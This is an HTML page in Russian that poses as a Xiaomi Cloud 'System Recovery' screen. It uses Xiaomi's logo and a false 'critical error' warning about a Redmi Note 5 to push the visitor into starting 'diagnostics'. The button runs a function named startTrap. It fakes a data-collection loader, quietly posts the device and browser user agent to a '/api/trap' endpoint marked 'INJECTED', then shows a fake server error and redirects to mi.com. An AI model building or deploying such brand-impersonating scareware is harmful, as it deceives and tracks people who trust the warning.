<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xiaomi Cloud — System Recovery</title>
    <style>
        body { background: #f5f5f5; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
        .logo { width: 60px; margin-bottom: 20px; }
        h1 { font-size: 1.2rem; color: #333; }
        p { color: #666; font-size: 0.9rem; margin-bottom: 30px; }
        .btn { background: #ff6700; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; font-weight: bold; display: block; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff6700; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ae/Xiaomi_logo_%282021-%29.svg" class="logo">
        <h1>Обнаружена критическая ошибка!</h1>
        <p>Ваше устройство <b>Redmi Note 5</b> может быть заблокировано из-за сбоя синхронизации Mi Cloud. <br><br> Требуется немедленная диагностика системы для сохранения данных.</p>
        <a href="#" class="btn" onclick="startTrap()">Запустить диагностику</a>
        <div id="loader" class="loader"></div>
    </div>

    <script>
        function startTrap() {
            document.getElementById('loader').style.display = 'block';
            document.querySelector('.btn').style.display = 'none';
            document.querySelector('p').innerText = "Идет сбор системных данных... Пожалуйста, не закрывайте страницу.";
            
            // Send signal to Lia Bridge
            fetch('/api/trap', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    device: 'Redmi Note 5', 
                    status: 'INJECTED',
                    ua: navigator.userAgent
                })
            }).then(() => {
                setTimeout(() => {
                    alert("Ошибка сервера. Пожалуйста, попробуйте позже.");
                    window.location.href = "https://mi.com";
                }, 3000);
            });
        }
    </script>
</body>
</html>
